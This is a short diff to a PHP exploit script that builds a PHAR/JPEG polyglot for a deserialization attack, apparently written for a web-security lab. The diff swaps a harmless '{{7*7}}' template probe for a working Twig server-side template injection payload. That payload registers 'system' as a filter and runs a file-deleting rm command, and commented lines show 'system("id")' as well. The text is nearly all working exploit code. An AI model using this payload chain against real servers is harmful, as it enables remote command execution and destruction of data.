@@ -101,7 +101,7 @@ function generate_polyglot($phar, $jpeg){
 // $object->inject = 'system("id");';
 // $object->out = 'Hallo World';
 
-$object = new CustomTemplate(new Blog("abc","{{7*7}}"));
+$object = new CustomTemplate(new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}"));
 // $object = new CustomTemplate;
 // $blog = new Blog;
 // $blog->desc = "{{7*7}}";
